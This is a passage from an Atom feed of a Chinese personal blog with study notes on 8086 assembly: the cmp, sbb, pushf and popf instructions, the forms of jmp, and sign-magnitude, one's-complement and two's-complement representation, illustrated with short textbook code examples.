class="code"><pre><span class="line">mov bx, 1000H</span><br><span class="line">mov ax, 003EH</span><br><span class="line">sub bx, 2000H</span><br><span class="line">sbb ax, 0020H</span><br></pre></td></tr></table></figure><h3 id="cmp指令"><a href="#cmp指令" class="headerlink" title="cmp指令"></a>cmp指令</h3><p>cmp是比较指令，功能相当于减法指令，只是不保存结果。执行后，对标志寄存器产生影响</p><ul><li>cmp指令格式：cmp 操作对象1，操作对象2</li><li>功能：计算操作对象1 - 操作对象2，但不保存结果</li></ul><p>经过<code>cmp</code>计算后，我们就可以用<code>je</code>、<code>jne</code>、<code>jb</code>、<code>jnb</code>、<code>ja</code>、<code>jna</code>指令进行跳转了。</p><p>因为比较复杂，在这里就不具体说实现的细节了，具体在更。</p><h3 id="pushf和popf指令"><a href="#pushf和popf指令" class="headerlink" title="pushf和popf指令"></a>pushf和popf指令</h3><p>pushf的功能是将标志寄存器的值压栈，而popf是从栈中弹出数据送入标志寄存器</p><p>这两个指令为直接访问寄存器提供了一种方法</p><hr><p>在这里，我们讨论了六种寄存器，另外还有IF，TF，和AF没有讨论，具体再更</p><p>完</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;h1 id=&quot;标志寄存器&quot;&gt;&lt;a href=&quot;#标志寄存器&quot; class=&quot;headerlink&quot; title=&quot;标志寄存器&quot;&gt;&lt;/a&gt;标志寄存器&lt;/h1&gt;&lt;/blockquote&gt;

&lt;p&gt;CPU内部
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://mingliangliu.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>原码反码和补码</title>
    <link href="https://mingliangliu.com/2019/02/28/%E5%8E%9F%E7%A0%81%E5%8F%8D%E7%A0%81%E5%92%8C%E8%A1%A5%E7%A0%81/"/>
    <id>https://mingliangliu.com/2019/02/28/原码反码和补码/</id>
    <published>2019-02-28T09:35:08.000Z</published>
    <updated>2019-08-04T16:31:45.361Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原码反码和补码"><a href="#原码反码和补码" class="headerlink" title="原码反码和补码"></a>原码反码和补码</h1><p>这里我们只讨论有符号数。我们都知道数在机器中都是以二进制表示的，而且常用二进制数的最高位表示其的正负，0为正，1为负</p><h2 id="原码"><a href="#原码" class="headerlink" title="原码"></a>原码</h2><p>原码的表示法很简单，对于一个二进制数n,</p><ul><li>当n为正数时，n的原码是在n上增加一个符号位0</li><li>当n为负数时，n的原码是在n上增加一个符号位1</li><li>n为0时，在原码中，有两种表示0的方式：0.0000 1.0000</li></ul><h2 id="反码"><a href="#反码" class="headerlink" title="反码"></a>反码</h2><p>对于一个二进制数n</p><ul><li>当n为正数时，n的反码和原码相同</li><li>当n为负数时，n的反码的符号位为1，数值部分是原码的数值部分按位取反</li><li>在反码表示中，有两种不同形式的0：0.0000 1.1111</li></ul><h2 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h2><p>对于一个二进制数n</p><ul><li>当n为正数时，n的补码和n的原码相同</li><li>当n为负数时，n的补码的符号为为1，数值部分是将原码数值按位取反加1</li><li>当n为0时，在补码表示中，0的表示是唯一的：0.0000</li></ul><blockquote><p>tip: 一个数补码的补码等于这个数</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;原码反码和补码&quot;&gt;&lt;a href=&quot;#原码反码和补码&quot; class=&quot;headerlink&quot; title=&quot;原码反码和补码&quot;&gt;&lt;/a&gt;原码反码和补码&lt;/h1&gt;&lt;p&gt;这里我们只讨论有符号数。我们都知道数在机器中都是以二进制表示的，而且常用二进制数的最高位表示其的正负
      
    
    </summary>
    
      <category term="数字逻辑" scheme="https://mingliangliu.com/categories/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/"/>
    
    
      <category term="数字逻辑" scheme="https://mingliangliu.com/tags/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/"/>
    
  </entry>
  
  <entry>
    <title>汇编转移指令</title>
    <link href="https://mingliangliu.com/2019/02/09/%E6%B1%87%E7%BC%96%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4/"/>
    <id>https://mingliangliu.com/2019/02/09/汇编转移指令/</id>
    <published>2019-02-09T03:46:09.000Z</published>
    <updated>2019-08-04T16:31:45.457Z</updated>
    
    <content type="html"><![CDATA[<p>在8086CPU中，转移指令可分为如下几类  </p><ul><li>无条件转移指令，如jmp</li><li>条件转移指令，如jcxz</li><li>循环指令，如loop</li><li>过程</li><li>中断</li></ul><p>在此，只先讨论无条件转移中的jmp，其他东西以后再更</p><p>jmp为无条件转移指令，可以只修改IP，也可以同时修改CS和IP</p><h2 id="依据位移进行转移的jmp指令"><a href="#依据位移进行转移的jmp指令" class="headerlink" title="依据位移进行转移的jmp指令"></a>依据位移进行转移的jmp指令</h2><p>所谓依据位移呢，就是根据转移指令到要转移的目的地址之间相差的字节数来进行转移的，相差的字节数由编译器进行计算给出，在生成的机器指令中只包含相差的字节数，不包含目的地址，这样会是的程序更加的灵活</p><h3 id="jmp-short-标号"><a href="#jmp-short-标号" class="headerlink" title="jmp short 标号"></a>jmp short 标号</h3><p>这种格式的jmp指令实现的是段内短转移，他对IP的修改范围为-128~127，超过这个范围会报错</p><p>使用如下面的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">codesg segment</span><br><span class="line">    start: mov ax,0</span><br><span class="line">           jmp short s</span><br><span class="line">           add ax,1</span><br><span class="line">        s: inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>参照书上的总结就是：jmp short 标号 的功能为：（IP）=(IP)+8位位移</p><ul><li>8位位移=标号处的地址-jmp指令后的第一个字节的地址（为什么是指令后第一个字节的地址，是因为和cpu执行指令的方式有关）</li><li>short指明此处的位移为8位位移</li><li>8位位移的范围为-128~127，用补码表示</li><li>8位位移由编译程序在编译时算出</li></ul><h3 id="jmp-near-ptr-标号"><a href="#jmp-near-ptr-标号" class="headerlink" title="jmp near ptr 标号"></a>jmp near ptr 标号</h3><p>它和jmp short 标号的功能相似，不过是实现的段内近转移</p><p>它实现的功能为：（IP）=（IP）+ 16为位移，类似上面</p><ul><li>16位位移=标号处的地址-jmp指令后的第一个字节的地址</li><li>near ptr 指明此处的位移为16位位移，进行的是段内近转移</li><li>16位位移的范围为-32768~32767，用补码表示</li><li>16为位移由编译程序在编译时给出</li></ul><h2 id="转移的目的地址在指令中的jmp指令"><a href="#转移的目的地址在指令中的jmp指令" class="headerlink" title="转移的目的地址在指令中的jmp指令"></a>转移的目的地址在指令中的jmp指令</h2><p>前面的jmp指令只能进行段间的转移，但是我们有时候需要转移的“更远”，这时候就需要这种类型的指令了</p><h3 id="jmp-far-ptr-标号"><a href="#jmp-far-ptr-标号" class="headerlink" title="jmp far ptr 标号"></a>jmp far ptr 标号</h3><p>此指令实现的是段间转移，又称为远转移功能如下</p><ul><li>（CS）=标号所在段的段地址，（IP）=标号在段中的偏移地址</li><li>far ptr 指明了用标号的段地址和偏移地址修改CS和IP</li></ul><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">codesg segment</span><br><span class="line"> start: mov ax,0</span><br><span class="line">        mov bx,0</span><br><span class="line">        jmp far ptr s</span><br><span class="line">        db 256 dup (0) ;这里用来占空</span><br><span class="line">     s: add ax,1</span><br><span class="line">        inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="转移地址在寄存器中的jmp指令"><a href="#转移地址在寄存器中的jmp指令" class="headerlink" title="转移地址在寄存器中的jmp指令"></a>转移地址在寄存器中的jmp指令</h2><h3 id="jmp-16位reg"><a href="#jmp-16位reg" class="headerlink" title="jmp 16位reg"></a>jmp 16位reg</h3><p>功能：（IP）=（16位reg）</p><h2 id="转移地址在内存中的jmp指令"><a href="#转移地址在内存中的jmp指令" class="headerlink" title="转移地址在内存中的jmp指令"></a>转移地址在内存中的jmp指令</h2><p>转移地址在内存中的jmp指令有两种格式：段内转移和段间转移</p><h3 id="jmp-word-ptr-内存单元地址（段内转移）"><a href="#jmp-word-ptr-内存单元地址（段内转移）" class="headerlink" title="jmp word ptr 内存单元地址（段内转移）"></a>jmp word ptr 内存单元地址（段内转移）</h3><p>功能：</p><ul><li>从内存单元地址处开始存放一个字，是转移的目的偏移地址</li><li>内存单元地址可用寻址方式的任一格式给出</li></ul><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">jmp word ptr ds:[0]</span><br></pre></td></tr></table></figure><h3 id="jmp-dword-ptr-内存单元地址（段间转移）"><a href="#jmp-dword-ptr-内存单元地址（段间转移）" class="headerlink" title="jmp dword ptr 内存单元地址（段间转移）"></a>jmp dword ptr 内存单元地址（段间转移）</h3><p>功能：</p><ul><li>从内存单元地址处开始存放者两个字，高地址的字为转移的目的段地址，低地址处为转移的目的偏移地址</li><li>（CS）=（内存单元地址+2），（IP）= （内存单元地址）</li><li>内存单元地址可以用寻址方式的任何一种格式给出</li></ul><p>例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br></pre></td></tr></table></figure><hr><p>本文总结自王爽的《汇编语言》，如有错误欢迎指正</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在8086CPU中，转移指令可分为如下几类  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无条件转移指令，如jmp&lt;/li&gt;
&lt;li&gt;条件转移指令，如jcxz&lt;/li&gt;
&lt;li&gt;循环指令，如loop&lt;/li&gt;
&lt;li&gt;过程&lt;/li&gt;
&lt;li&gt;中断&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在此，只先讨论
      
    
    </summary>
    
      <category term="汇编" scheme="https://mingliangliu.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="汇编" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
</feed>
